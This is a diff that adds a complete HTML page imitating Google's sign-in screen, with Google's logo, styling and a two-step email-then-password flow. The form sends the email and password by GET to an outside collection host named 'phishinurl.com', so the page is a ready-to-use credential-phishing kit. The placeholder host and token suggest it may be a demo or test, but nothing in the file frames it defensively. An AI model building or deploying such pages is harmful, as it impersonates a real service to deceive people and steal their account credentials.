@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Sign-In</title>
+    <style>
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background-color: #f2f2f2;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #202124;
+        }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+            text-align: center;
+        }
+        .logo img {
+            width: 75px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            font-size: 24px;
+            margin: 0;
+            color: #202124;
+        }
+        p {
+            margin: 10px 0 20px;
+            color: #202124;
+            font-size: 16px;
+        }
+        .input-container {
+            margin-bottom: 16px;
+            text-align: left;
+        }
+        .input-container label {
+            font-size: 14px;
+            color: #5f6368;
+        }
+        .input-container input {
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        .forgot-email {
+            text-align: left;
+            margin: 8px 0 24px;
+        }
+        .forgot-email a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .btn {
+            background-color: #1a73e8;
+            color: #fff;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+            width: 100%;
+        }
+        .btn:hover {
+            background-color: #1558b0;
+        }
+        .create-account {
+            margin-top: 20px;
+        }
+        .create-account a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .footer {
+            display: flex;
+            justify-content: center;
+            margin-top: 30px;
+            font-size: 12px;
+            color: #5f6368;
+        }
+        .footer a {
+            color: #5f6368;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        #password-container {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo">
+        </div>
+        <h1>Sign in</h1>
+        <p>Use your Google Account</p>
+        <form id="login-form" action="http://phishinurl.com/" method="GET">
+            <input type="hidden" name="csrf-token" value="testingtoken">
+            <div id="email-container" class="input-container">
+                <label for="email">Email or phone</label>
+                <input type="text" id="email" name="email" required>
+            </div>
+            <div class="forgot-email" id="forgot-email">
+                <a href="#">Forgot email?</a>
+            </div>
+            <div id="password-container" class="input-container">
+                <label for="password">Enter your password</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            <button type="button" class="btn" id="next-button" onclick="showPasswordField()">Next</button>
+            <button type="submit" class="btn" id="submit-button" style="display: none;">Submit</button>
+        </form>
+        <div class="create-account">
+            <a href="#">Create account</a>
+        </div>
+        <div class="footer">
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+    </div>
+    <script>
+        function showPasswordField() {
+            var emailField = document.getElementById('email').value;
+            if (emailField) {
+                document.getElementById('email-container').style.display = 'none';
+                document.getElementById('forgot-email').style.display = 'none';
+                document.getElementById('password-container').style.display = 'block';
+                document.getElementById('next-button').style.display = 'none';
+                document.getElementById('submit-button').style.display = 'block';
+            } else {
+                alert('Please enter your email or phone.');
+            }
+        }
+    </script>
+</body>
+</html>
